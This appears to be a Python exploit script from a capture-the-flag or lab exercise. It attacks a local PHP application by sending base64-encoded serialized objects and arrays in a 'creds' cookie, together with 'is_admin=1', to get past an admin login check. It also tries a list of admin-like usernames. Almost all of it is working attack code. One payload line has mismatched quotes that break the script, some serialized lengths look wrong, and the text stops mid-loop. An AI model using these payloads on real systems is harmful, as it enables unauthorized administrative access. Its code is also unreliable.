import requests
import base64
import re

base_url = "http://127.0.0.1:32921/"

# ArrayObject implements Serializable interface in PHP
# The correct serialization format is different
# Let's test various formats

print("[*] Testing ArrayObject serialization formats...\n")

arrayobject_payloads = [
    # Standard object format (may not work for ArrayObject)
    ('AO_standard', 'O:11:"ArrayObject":0:{}'),
    
    # With memberNames (ArrayObject serialization)
    ('AO_with_flag', 'O:11:"ArrayObject":1:{s:8:"username";s:5:"admin";}'),
    
    # Try with private storage property
    ('AO_storage', 'O:11:"ArrayObject":1:{s:18:"\x00*\x00storage";a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}}'),
    
    # ArrayIterator also implements ArrayAccess
    ('AI_standard', 'O:13:"ArrayIterator":0:{}'),
    ('AI_with_data', 'O:13:"ArrayIterator":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}'),
    
    # ArrayObject with Serializable format (C: serialized data)
    ('AO_serializable', 'C:11:"ArrayObject":47:{x:i:0;a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";};m:a:0:{}}'),
]

for name, payload in arrayobject_payloads:
    payload_b64 = base64.b64encode(payload.encode()).decode()
    headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
    resp = requests.get(base_url, headers=headers)
    
    has_error = "Fatal error" in resp.text or "Warning" in resp.text
    has_rejection = "you are not the admin" in resp.text
    
    print(f"    {name}: {len(resp.content)}B {'[ERROR]' if has_error else '[OK]'} {'[REJECTED]' if has_rejection else '[BYPASSED]'}")
    
    if has_error:
        err_match = re.search(r'(<b>Fatal error</b>.*?<br />|<b>Warning</b>.*?<br />)', resp.text)
        if err_match:
            print(f"        {err_match.group(1)[:150]}")
    
    if not has_rejection and not has_error:
        print(f"        [!!!] CHECK THIS - no rejection and no error!")
        content = re.search(r'</form>(.*?)</body>', resp.text, re.DOTALL)
        if content:
            print(f"        Content: {content.group(1).strip()[:200]}")

print("\n" + "="*80 + "\n")

# Try using the C: format for Serializable classes
print("[*] Testing Serializable format (C:) for various classes...\n")

serializable_payloads = [
    # ArrayObject with C: format (correct for Serializable)
    ('AO_C_format', 'C:11:"ArrayObject":55:{x:i:0;a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";};m:a:0:{}}'),
    
    # Simpler ArrayObject C format
    ('AO_C_simple', 'C:11:"ArrayObject":23:{x:i:0;a:0:{};m:a:0:{}}'),
    
    # ArrayIterator C format
    ('AI_C_format', 'C:13:"ArrayIterator':56:{x:i:0;a:2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";};m:a:0:{}}'),
]

for name, payload in serializable_payloads:
    try:
        payload_b64 = base64.b64encode(payload.encode()).decode()
        headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
        resp = requests.get(base_url, headers=headers)
        
        has_error = "Fatal error" in resp.text or "Warning" in resp.text
        has_rejection = "you are not the admin" in resp.text
        
        print(f"    {name}: {len(resp.content)}B {'[ERROR]' if has_error else '[OK]'} {'[REJECTED]' if has_rejection else '[BYPASSED]'}")
        
        if not has_rejection:
            content = re.search(r'</form>(.*?)</body>', resp.text, re.DOTALL)
            if content:
                print(f"        Content: {content.group(1).strip()[:200]}")
    except Exception as e:
        print(f"    {name}: Exception - {e}")

print("\n" + "="*80 + "\n")

# Let me also check if there's a specific "admin" username check
# The code checks if user is admin - maybe the username needs to be "admin"
print("[*] Testing username variations...\n")

usernames = ['admin', 'Admin', 'ADMIN', 'administrator', 'root', 'Administrator', 'burns', 'Burns', 'BURNS', 'Montgomery', 'Montgomery Burns']

for username in usernames:
    payload = f'a:2:{{s:8:"username";s:{len(username)}:"{username}";s:8:"password";s:5:"admin";}}'
    payload_b64 = base64.b64encode(payload.encode()).decode()
    headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
    resp = requests.get(base_url, headers=headers)
    
    has_rejection = "you are not the admin" in resp.text
    
    print(f"    username={username}: {len(resp.content)}B {'[REJECTED]' if has_rejection else '[BYPASSED]'}")
    
    if not has_rejection:
        content = re.search(r'</form>(.*?)</body>', resp.text, re.DOTALL)
        if content:
